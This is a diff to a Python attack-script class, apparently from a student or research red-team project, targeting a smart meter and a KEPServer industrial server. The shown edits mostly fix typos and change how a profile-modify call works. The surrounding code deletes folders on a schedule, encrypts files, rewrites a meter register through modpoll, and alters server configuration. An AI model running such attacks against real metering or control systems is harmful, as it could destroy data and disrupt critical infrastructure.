@@ -119,9 +119,9 @@ class AttackScript:
 
     def scheduled_task_delete_files(self, folder_path, revert=False) -> None:
         """
-        # NOTE: This is adapted from the previous team. I dont even know if the smartmeter path even exist tbh
+        # NOTE: This is adapted from the previous team. I don''t even know if the smartmeter path even exists tbh
         
-        Delete the smartmeter path prediodically through task scheduler through the executable attack 1. If the executable doesnt exist in the destination device, try to package this script to exe and transfer the exe remotely
+        Delete the smartmeter path periodically through task scheduler through the executable attack 1. If the executable doesnt exist in the destination device, try to package this script to exe and transfer the exe remotely
         
         Args:
             folder_path (str): path of folder to be deleted
@@ -532,7 +532,7 @@ class AttackScript:
 
             print('Decrypted file saved to ' + decryptedFile)
         except Exception as e:
-            print("File have not been encrypted.")
+            print("File has not been encrypted.")
 
     # Run modpoll to change register 40201 to 26
     def change_meterID(self, revert: bool=False) -> None:
@@ -728,6 +728,7 @@ class AttackScript:
         return
 
     def kep_connect(self, port: int = 57412) -> connection.server:
+        global username, password
         print(f"IP is : {self.WINDOWS_SERVER_IP}")
         """
         Connects to the KEPServer.
@@ -971,11 +972,11 @@ class AttackScript:
         server = self.kep_connect()
         print(json.dumps(connectivity.udd.profile.get_all_profiles(server), indent=4))
 
-    def kep_modify_udd_profile(self, profile_name, description):
+    def kep_modify_udd_profile(self, profile_name, new_profile_name, description):
         server = self.kep_connect()
-        print(json.dumps(connectivity.udd.profile.modify_profile(server, {"common.ALLTYPES_NAME": profile_name,
-                                                                          "common.ALLTYPES_DESCRIPTION": description}), indent=4))
-        print(json.dumps(connectivity.udd.profile.get_profile(server, profile_name), indent=4))
+        print(json.dumps(connectivity.udd.profile.modify_profile(server, {"common.ALLTYPES_NAME": new_profile_name,
+                                                                          "common.ALLTYPES_DESCRIPTION": description}, profile_name=profile_name), indent=4))
+        print(json.dumps(connectivity.udd.profile.get_profile(server, new_profile_name), indent=4))
         
     def kep_add_log_group(self, log_group, description):
         server = self.kep_connect()
